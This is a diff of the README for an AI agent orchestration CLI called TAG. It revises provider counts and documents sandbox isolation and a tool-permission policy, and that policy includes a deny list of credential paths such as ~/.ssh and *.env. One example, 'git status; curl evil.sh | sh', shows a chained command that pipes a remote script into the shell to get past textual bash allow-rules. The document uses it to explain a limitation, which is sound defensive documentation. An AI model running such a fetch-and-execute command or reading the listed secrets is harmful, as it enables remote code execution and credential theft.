@@ -31,7 +31,9 @@
 
 ---
 
-TAG is a production-grade AI agent orchestration CLI. It routes tasks across 10+ AI providers, manages autonomous loops and cron schedules, tracks spend with hard budget limits, scans for credential leaks, and ships with 44 built-in capabilities — from background job queues to architect/editor agent splits — all backed by a crash-safe WAL-mode SQLite store.
+TAG is a production-grade AI agent orchestration CLI. It manages autonomous loops and cron schedules, tracks spend with hard budget limits, scans for credential leaks, and ships **103 top-level commands** in the Python edition (**86** in the native Go harness) — from background job queues to architect/editor agent splits — all backed by a crash-safe WAL-mode SQLite store.
+
+On providers, precisely: the native Go harness ships **4 provider adapters** — `anthropic`, `openai`, an offline `echo` provider, and `local`, which speaks to **any OpenAI-compatible endpoint** (llama.cpp, Ollama, vLLM, LM Studio, or a hosted gateway) — plus **18 credential importers** that pull existing keys out of tools you already use (Claude Code, Codex, Cursor, Zed, Gemini CLI, Aider, Continue, opencode, AWS Bedrock, Mistral, and more). The importers configure credentials; they are not separate runtime adapters.
 
 ---
 
@@ -426,7 +428,7 @@ tag tool-index search "send a Slack message"
 tag tool-index status --json
 ```
 
-High-cardinality MCP server catalogs are indexed and searched semantically so only the relevant subset enters the context window.
+High-cardinality MCP server catalogs are indexed and searched by **keyword** — case-insensitive substring matching over tool names and descriptions, not embeddings or semantic similarity — so only the relevant subset enters the context window. Semantic (vector) retrieval is not implemented for tools; it exists separately for memories via `tag mem2 store search`.
 
 ---
 
@@ -464,12 +466,75 @@ tag marketplace push coder
 ### Sandbox / Code Execution
 
 ```bash
-# Run agent-generated code in an isolated sandbox
-tag sandbox run --code "print('hello')" --language python
+# Run a command under OS-level isolation (restricted backend is the default)
+tag sandbox run "python3 -c 'print(1+1)'" --dir ./scratch
 
-# List past sandbox runs
+# Report exactly what isolation was achieved, plus stdout/stderr/exit
+tag sandbox run "echo hi" --dir ./scratch --json
+
+# Stronger isolation via a container
+tag sandbox run "make test" --backend docker --image python:3.12 --network none
+
+# List past sandbox runs (Python edition)
 tag sandbox list --json
 ```
+
+> Command surface differs by edition: Python has `sandbox run|list|result`; the Go
+> harness currently has **`sandbox run` only**.
+
+**`--backend restricted` performs real OS-level isolation** — it is not advisory, and it
+**fails closed**: if it cannot install the isolation policy, the run is refused rather
+than executed unconfined.
+
+- **macOS** — the command runs under a generated `sandbox-exec` SBPL profile: network
+  denied; `/etc`, `/private/etc`, `/var/db`, `/private/var/db` and `master.passwd`
+  unreadable; `$HOME` credential paths (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.config`,
+  `~/.gcloud`, `~/.kube`, `~/.docker`, `~/Library/Keychains`) denied for read *and*
+  write; the run dir read/write; `/usr`, `/bin`, `/sbin`, `/System`, `/Library`
+  read-only.
+- **Linux** — a Landlock filesystem allow-list plus rlimits (`RLIMIT_CPU`, `RLIMIT_AS`).
+  Honest caveat: **network is blocked only when the kernel permits it** (an unprivileged
+  user namespace, or Landlock ABI ≥ 4). When it can't be blocked, that is *stated in the
+  reported isolation string* rather than silently assumed.
+- **Other OSes** — unsupported, and the run fails closed.
+- **The run directory is the read/write boundary**, so a too-broad `--dir` is refused:
+  `tag sandbox run 'echo x' --dir /` errors with *"refusing to run with `/` as the run
+  directory"* and reports `isolation: none (failed closed: run directory too broad to
+  confine)`.
+- Every run reports an **`isolation` field** (text output and `--json`) describing what
+  was *actually* achieved — including `none (failed closed: ...)`. Read it; don't assume.
+- **The sandboxed command's exit code propagates**: `tag sandbox run 'exit 42'` exits 42.
+
+### Tool permissions (Go harness)
+
+Tools the *model* asks to run are gated by an allow/ask/deny policy before they execute.
+This is separate from the sandbox: the sandbox bounds what an allowed command can reach,
+the permission model decides whether it runs at all.
+
+```bash
+tag permissions show              # resolved ruleset + whether prompting is possible
+tag permissions log --limit 20    # what was approved or denied, and by which rule
+tag run "..." --tools --allow-tool bash          # grant a tool
+tag run "..." --tools --allow-tool 'write_file:src/**'   # grant a tool for a path glob
+tag run "..." --tools --auto-approve             # upgrade every `ask` to allow
+```
+
+- **Defaults:** `read_file`/`list_dir` allow (already root-confined); `write_file` and
+  `bash` **ask**; anything else (MCP tools, plugins) **ask**. `bash` is never allow.
+- **Credential paths are denied by default** even inside the tool root — `*.env`,
+  `~/.ssh/**`, `~/.aws/**`, `*.pem`, `id_rsa`, `.netrc` and friends, with
+  `*.env.example`/`.sample`/`.template` carved out. A blanket `default: allow` cannot
+  silently unprotect them; you must name the path explicitly.
+- **Precedence:** CLI flag (most specific first) → profile config → root config →
+  built-in credential denies → configured default → built-in per-tool default.
+- **Non-interactive is safe by construction.** With no TTY an `ask` **denies immediately**
+  with an actionable message — it never hangs waiting for input and never silently
+  auto-approves. Background surfaces (`queue worker`, `dag run --execute`,
+  `cron run --execute`) are forced non-interactive even on a terminal, because pausing a
+  background drain to wait on a human is exactly the silent hang TAG refuses to ship.
+- **Honest limitation:** `bash` command patterns are textual, not semantic —
+  `--allow-tool 'bash:git *'` is defeated by `git status; curl evil.sh | sh`. A bash
+  allow-rule is a convenience, not a security boundary; the sandbox is.
 
 ---
 
@@ -732,7 +797,8 @@ CGO_ENABLED=0 go build -o tag ./cmd/tag   # Go 1.25+
 go test ./...                             # fully offline; no API keys needed
 ```
 
-- **88 top-level commands across 29 packages** — the full control plane ported, plus a native runtime: a provider-neutral LLM interface with raw-HTTP SSE streaming for **Anthropic, OpenAI, and a keyless local OpenAI-compatible server** (llama.cpp / ollama / LM Studio / vLLM), a tool-calling agent loop, sandboxed built-in tools with an opt-in Exa `web_search` (`tag run --web`, needs `EXA_API_KEY`) and per-run tool-budget trimming (`--disable-tools`), an MCP client + server, HTTP `serve`/`devui`/`web` dashboards, an OpenAI-compatible chat gateway (`tag gateway`), an LSP server, and a terminal TUI.
+- **86 top-level commands across 29 packages** (240 help nodes; Cobra lists 88 including its own `help`/`completion` built-ins) — the control plane ported, plus a native runtime: a provider-neutral LLM interface with raw-HTTP SSE streaming for **Anthropic, OpenAI, and a keyless local OpenAI-compatible server** (llama.cpp / ollama / LM Studio / vLLM), a tool-calling agent loop, OS-isolated built-in tools with an opt-in Exa `web_search` (`tag run --web`, needs `EXA_API_KEY`) and per-run tool-budget trimming (`--disable-tools`), an MCP client + server, three partial HTTP dashboards (`serve`/`devui`/`web` — different route sets, see [`tag-go/MIGRATION_STATUS.md`](tag-go/MIGRATION_STATUS.md)), an OpenAI-compatible chat gateway (`tag gateway`), a **hover-only** LSP server, and a terminal TUI.
+- **Known Go gaps** (vs the Python edition): no `swarm run`/`swarm abort` (only the read-only `swarm list/status/results`); `agentic-ci` is a single check→fix command rather than Python's 7 subcommands; `tag lsp` implements hover and nothing else. Tracked in [`tag-go/MIGRATION_STATUS.md`](tag-go/MIGRATION_STATUS.md).
 - **Offline by default:** execution paths run against a built-in `echo` provider so everything is testable without keys; pass `--provider anthropic|openai` to go live, or `--provider local` to hit a local model (defaults to llama.cpp's `http://localhost:8080/v1`; override with `TAG_LOCAL_BASE_URL`, and set `TAG_LOCAL_API_KEY` only if your server requires auth). Because `local` needs no key, it's the ideal last-resort step at the bottom of a `--fallback` chain — a CPU-local model keeps answering when every cloud provider is down.
 - **Executes its own queue:** a native execution worker drives queued jobs and DAG dependency chains through the agent loop (`tag queue worker`, `tag dag run --execute`, `tag cron run --execute`).
 - **Serves an OpenAI-compatible API:** `tag gateway` fronts the agent loop with `POST /v1/chat/completions` (streaming SSE + non-stream), `GET /v1/models`, and `GET /health` behind optional bearer-token auth — point any OpenAI client at it. A request model may carry a `provider/` prefix (else `--provider` picks the default), and `--fallback` walks the profile's `route_fallbacks` chain at inference time. Loopback-only by default; a public bind requires `--key`/`TAG_GATEWAY_KEY` (or an explicit `--allow-unauthenticated`).
@@ -749,7 +815,7 @@ Per-subsystem status and audit history: [`tag-go/MIGRATION_STATUS.md`](tag-go/MI
 | Feature | TAG | Claude Code | Aider | AutoGen | CrewAI |
 |---|---|---|---|---|---|
 | **CLI-first** | ✓ | ✓ | ✓ | — | — |
-| **Any provider** | ✓ (15+ imports) | Anthropic only | ✓ | ✓ | ✓ |
+| **Provider support** | Anthropic, OpenAI, `local` (any OpenAI-compatible endpoint), offline `echo` — 4 adapters + 18 credential importers | Anthropic only | ✓ | ✓ | ✓ |
 | **Background queue** | ✓ priority + DAG | — | — | — | — |
 | **Cron scheduling** | ✓ | — | — | — | — |
 | **Autonomous loop** | ✓ | via subagents | — | ✓ | ✓ |
